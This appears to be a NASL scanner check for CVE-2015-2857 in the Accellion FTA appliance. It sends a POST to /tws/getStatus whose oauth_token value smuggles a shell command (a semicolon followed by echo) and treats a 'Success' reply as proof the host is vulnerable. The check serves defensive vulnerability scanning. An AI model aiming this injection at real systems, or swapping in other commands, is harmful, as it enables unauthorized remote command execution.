CPE = "cpe:/h:accellion:secure_file_transfer_appliance";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.106032" );
	script_version( "$Revision: 13659 $" );
	script_tag( name: "last_modification", value: "$Date: 2019-02-14 09:34:21 +0100 (Thu, 14 Feb 2019) $" );
	script_tag( name: "creation_date", value: "2015-08-05 10:57:09 +0700 (Wed, 05 Aug 2015)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_cve_id( "CVE-2015-2857" );
	script_name( "Accellion FTA Remote Command Execution Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "This script is Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_accellion_fta_detect.sc" );
	script_mandatory_keys( "accellion_fta/installed" );
	script_tag( name: "summary", value: "Accellion FTA is prone to a remote command execution vulnerability" );
	script_tag( name: "vuldetect", value: "Send a crafted POST request and check the response." );
	script_tag( name: "insight", value: "The vulnerability is due to insufficient sanitization of the
'oauth_token' parameter. The parameter is passed into the system() command line through multiple mod_perl
handlers." );
	script_tag( name: "impact", value: "An unauthenticated attacker can gain complete access to the
appliance." );
	script_tag( name: "affected", value: "Accellion FTA Version 9.11.200 and prior." );
	script_tag( name: "solution", value: "Upgrade to version 9.11.210 or later." );
	script_xref( name: "URL", value: "https://packetstormsecurity.com/files/132665/Accellion-FTA-getStatus-verify_oauth_token-Command-Execution.html" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
host = http_host_name( port: port );
useragent = http_get_user_agent();
data = NASLString( "transaction_id=", rand(), "&oauth_token='%3becho '" );
req = "POST /tws/getStatus HTTP/1.1\r\n" + "Host: " + host + "\r\n" + "User-Agent: " + useragent + "\r\n" + "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n" + "Content-Type: application/x-www-form-urlencoded\r\n" + "Content-Length: " + strlen( data ) + "\r\n\r\n" + data + "\r\n";
buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
if(ContainsString( buf, "\"result_msg\":\"Success\",\"transaction_id\":\"" )){
	security_message( port: port );
	exit( 0 );
}
exit( 0 );

